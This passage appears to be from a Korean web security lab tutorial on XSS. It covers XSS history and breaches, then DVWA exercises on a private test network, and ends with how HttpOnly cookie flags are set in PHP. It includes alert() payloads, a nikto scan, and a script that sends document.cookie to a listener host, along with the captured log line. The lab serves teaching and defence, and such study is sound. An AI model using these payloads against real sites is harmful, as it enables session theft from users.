...
같은 해 **2000년 2월, 미국 CERT/CC(CERT 조정센터)가 권고문 CA-2000-02 "Malicious HTML Tags Embedded in Client Web Requests"** 를 발표하면서 이 문제가 업계 전체에 공식화되었습니다. 즉 XSS는 특정 제품의 버그가 아니라 **"웹이 HTML을 신뢰해 실행한다"는 구조 자체에서 나온 결함**으로 규정되었습니다.

### 주요 침해 사건

| 연도 | 사건 | 내용 |
|---|---|---|
| 2005 | **Samy 웜 (MySpace)**[^c02_samy] | Samy Kamkar가 만든 **Stored XSS 웜**. 프로필을 본 사람이 자동으로 그를 친구 추가 + 같은 코드를 자기 프로필에 복제 → **20시간 만에 100만 명** 감염. 역사상 가장 빠르게 퍼진 웜 중 하나로, 제작자는 미 비밀경호국 수사를 받음 |
| 2014 | **TweetDeck 자가 전파 XSS** | 트윗 안의 스크립트가 그것을 본 사용자 계정으로 자동 리트윗되며 확산 → 서비스 일시 중단 |
| 2018 | **British Airways (Magecart)**[^c02_ba] | 결제 페이지에 악성 자바스크립트가 주입되어 **약 38만 건의 카드 정보**를 외부로 전송(웹 스키밍). GDPR 거액 과징금 |
...
```
http://192.168.56.30/page.html#name=<img src=x onerror=alert(document.cookie)>
```
...
```html
<script>document.location='http://192.168.56.10/steal?c='+document.cookie</script>
```
...
```
192.168.56.30 - - [01/Jun/2026 11:00:00] "GET /steal?c=PHPSESSID=abc123; security=low HTTP/1.1" 200 -
```
...
```
http://192.168.56.30/DVWA/vulnerabilities/xss_d/?default=<script>alert(document.cookie)</script>
```
...
```bash
nikto -h http://192.168.56.30/DVWA/ -C all
```
...
#### HttpOnly·security 플래그는 "어디서" 만들어지나 — 소스로 확인하기

`HttpOnly`·`Secure`·`SameSite`, 그리고 DVWA의 `security` 값은 **모두 서버가 `Set-Cookie` 응답 헤더를 만들 때** 붙입니다. 브라우저는 그 헤더를 받아 저장·강제할 뿐, 클라이언트가 "만드는" 것이 아닙니다.

**PHP에서 플래그를 켜는 위치는 세 군데입니다.**

| 위치 | 코드 | 적용 대상 |
|---|---|---|
| 개별 쿠키 | `setcookie('name', $v, ['httponly'=>true, 'secure'=>true, 'samesite'=>'Strict'])` | 그 쿠키 1개 |
| 세션 쿠키 | `session_set_cookie_params(['httponly'=>true, ...])` (반드시 `session_start()` **전**) | `PHPSESSID` |
| 전역 기본값 | php.ini `session.cookie_httponly = On` / `session.cookie_secure = On` | 모든 세션 쿠키 |

어떤 방식이든 결과는 응답 헤더 한 줄(`Set-Cookie: ...; HttpOnly`)이며, `curl -I` 로 바로 확인됩니다.

**DVWA의 `security`·`PHPSESSID` 쿠키는 어디서 만들까요?** 앞 [2.4 Nikto 스캔](#24-nikto로-xss-취약점-스캔)이 *"Cookie `security` created without the httponly flag"* 라고 지적했죠. 그 출처를 직접 봅니다.

> 파일: `/var/www/html/DVWA/dvwa/includes/dvwaPage.inc.php` → 함수 `dvwaSecurityLevelSet()`
{: .prompt-tip }

```php
function dvwaSecurityLevelSet( $pSecurityLevel ) {
    if( $pSecurityLevel == 'impossible' ) { $httponly = true; }
    else { $httponly = false; }
    setcookie( 'security', $pSecurityLevel, 0, "/", "", false, $httponly );
    //          이름        값             만료 경로 도메인 secure  httponly
}
```

`setcookie()` 의 **위치 인자 순서**가 `(name, value, expires, path, domain, secure, httponly)` 이므로, 6번째 `false`=Secure 끔, 7번째 `$httponly` 가 HttpOnly입니다. 결과적으로:

| security 레벨 | HttpOnly |
|---|---|
| low / medium / high | **false** (JS로 읽힘) |
| impossible | **true** |

`PHPSESSID` 도 같은 파일의 `dvwa_start_session()` → `session_set_cookie_params()` 에서 만들며, 역시 **impossible일 때만** `httponly=true`(+ `samesite=Strict`)가 됩니다.

**직접 확인(View Source 대신 응답 헤더로):**

```bash
# low — HttpOnly 없음 (그래서 document.cookie 로 탈취 가능)
curl -I "http://192.168.56.30/DVWA/security.php" --cookie "PHPSESSID=<세션>; security=low"
# → Set-Cookie: security=low            (HttpOnly 플래그 없음)
```

> **이것이 두 실습을 잇는 핵심입니다.** ① 이 절의 XSS 쿠키 탈취가 통하는 이유 = `security`·`PHPSESSID`에 **HttpOnly가 없어서** `document.cookie`로 읽히기 때문이고, ② [06번 쿠키 변조 실습](/posts/websec-06-session-security/)이 통하는 이유 = `security` 쿠키가 **HttpOnly도 서명(HMAC)도 없어서** 값을 `low → high`로 바꿔도 서버가 그대로 믿기 때문입니다. impossible로 올리면 HttpOnly가 붙어 ①이 막힙니다.
{: .prompt-warning }
...
- XSS 용어/최초 권고: CERT/CC Advisory CA-2000-02 (2000) — <https://www.cert.org/historical/advisories/CA-2000-02.cfm>
- OWASP XSS Prevention Cheat Sheet — <https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html>
- DVWA GitHub — <https://github.com/digininja/DVWA>
- PortSwigger XSS Labs — <https://portswigger.net/web-security/cross-site-scripting>

[^c02_samy]: Samy (computer worm), MySpace 2005 — 20시간 내 100만+ 친구 추가(최속 전파 웜). Wikipedia. <https://en.wikipedia.org/wiki/Samy_(computer_worm)>
[^c02_ba]: British Airways data breach 2018(Magecart) — BA 발표 기준 약 38만 건 카드(ICO는 429,612명으로 상술). Wikipedia. <https://en.wikipedia.org/wiki/British_Airways_data_breach>
